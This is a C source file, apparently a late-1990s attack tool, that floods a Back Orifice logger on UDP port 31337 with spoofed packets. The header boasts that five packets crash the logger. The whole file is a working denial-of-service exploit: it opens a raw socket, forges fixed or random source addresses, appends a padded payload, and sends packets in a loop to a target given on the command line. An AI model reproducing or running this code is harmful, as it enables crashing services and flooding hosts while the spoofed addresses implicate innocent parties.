/**************************************/
/* Back orifice server flooder        */
/* Send random spoofed udp bo packet  */
/* to some lame logger                */
/* This code crash with just 5 packet */
/* the old fakebo and the real one    */
/* The lasted just need more packet   */
/* to crash ;)                        */
/* Another code from Bong             */
/* nonfind@kisa.or.kr                 */
/**************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <linux/udp.h>
#include <netdb.h>
#include <signal.h>
#define getrandom(min, max) ((rand() % (int)(((max)+1) - (min))) + (min))
#define err(x) { fprintf(stderr, x); exit(1); }
int i;
char data[] = {
	0xCE,	0x63,	0xD1,	0xD2,	0x16,
	0xE7,	0x13,	0xCF,	0x3D,	0xA5,
	0xA5,	0x86,	0xB2,	0x75,	0x4B,
	0x99,	0x9F,	0x18,	0x58,	0x86,
	0x89,	0x99};

void brek(int no){
   printf("\nStoped\n%d packet sended!\n",i);
   exit(1);
}

int sendpkt_udp (sin, sock, data, len, src, dst, sport, dport)
     struct sockaddr_in *sin;
     unsigned short int sock, len, sport, dport;
     unsigned long int src, dst;
     char *data;
{
  struct iphdr ip;
  struct udphdr udp;
  static char packet[8192];
  char crashme[500];
  ip.ihl = 5;
  ip.version = 4;
  ip.tos = rand () % 100;;
  ip.tot_len = htons (28 + len);
  ip.id = htons (31337 + (rand () % 100));
  ip.frag_off = 0;
  ip.ttl = 255;
  ip.protocol = IPPROTO_UDP;
  ip.check = 0;
  ip.saddr = src;
  ip.daddr = dst;
  udp.source = htons (sport);
  udp.dest = htons (dport);
  udp.len = htons (8 + len);
  udp.check = (short) 0;
  memcpy (packet, (char *) &ip, sizeof (ip));
  memcpy (packet + sizeof (ip), (char *) &udp, sizeof (udp));
  memcpy (packet + sizeof (ip) + sizeof (udp), (char *) data, len);
  memcpy (packet + sizeof (ip) + sizeof (udp) + len, crashme, 500);
  return sendto (sock, packet, sizeof (ip) + sizeof (udp) + len + 500, 0, (struct sockaddr *) sin, sizeof (struct sockaddr_in));
}

unsigned int lookup (char *host)
{
  unsigned int addr;
  struct hostent *he;
  addr = inet_addr (host);
  if (addr == -1){
      he = gethostbyname (host);
      if ((he == NULL) || (he->h_name == NULL) || (he->h_addr_list == NULL))
        return 0;
      bcopy (*(he->h_addr_list), &(addr), sizeof (he->h_addr_list));}
  return (addr);
}

void main (int argc, char **argv)
{
  unsigned int src,dst;
  char *tmpsrc;
  struct sockaddr_in sin;
  struct hostent *hep;
  long wait=25000;
  int sock,dstP,srcP=113,nb=1,mod,a,b,c,d;
  signal(SIGINT, brek);
  if (argc < 3){
    printf("\nBo logger flooder by Bong\n");
    printf ("Usage: %s <mode> [source] <target> [numb]\n",argv[0]);
    printf("Mode 1: one source\n");
    printf("Mode 2: random source\n\n");
    exit(1);}
  if ((sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
    err("Unable to open raw socket.\n");
  mod=atoi(argv[1]);
  if (mod==1){
  if (argc < 4) printf("Need at least 3 argument");
  if (!(src = lookup (argv[2])))
    err ("Unable to lookup address.\n");
    if (!(dst = lookup (argv[3])))
    err ("Unable to lookup address.\n");
    tmpsrc=(argv[3]);
    if(argv[4]){ nb = atoi(argv[4]);} 
}else{
    if (!(dst = lookup (argv[2])))   
    err("Unable to lookup address..\n");
    tmpsrc=(argv[2]);
    if(argv[3]){ nb = atoi(argv[3]);}
  }
  sin.sin_family = AF_INET;
  sin.sin_port = 31337;
  sin.sin_addr.s_addr = dst;
  printf("Flood %s with mode %d and %d packet\n",tmpsrc,mod,nb);
  for(i=0; i < nb; i++){
  if (mod==2){
   srandom((time(0)+i));
   srcP = getrandom(1,1500)+1000;
   a = getrandom(0, 255);
   b = getrandom(0, 255);
   c = getrandom(0, 255);
   d = getrandom(0, 255);
   sprintf(tmpsrc, "%i.%i.%i.%i", a, b, c, d);
   hep=gethostbyname(tmpsrc);
   src= *(unsigned long *)hep->h_addr;}
  if ((sendpkt_udp (&sin, sock, &data,sizeof(data),src,dst,srcP,31337)) == -1)
  err ("Error sending the UDP packet.\n");}
  printf("\n%d Packet sended!\n",i);
}

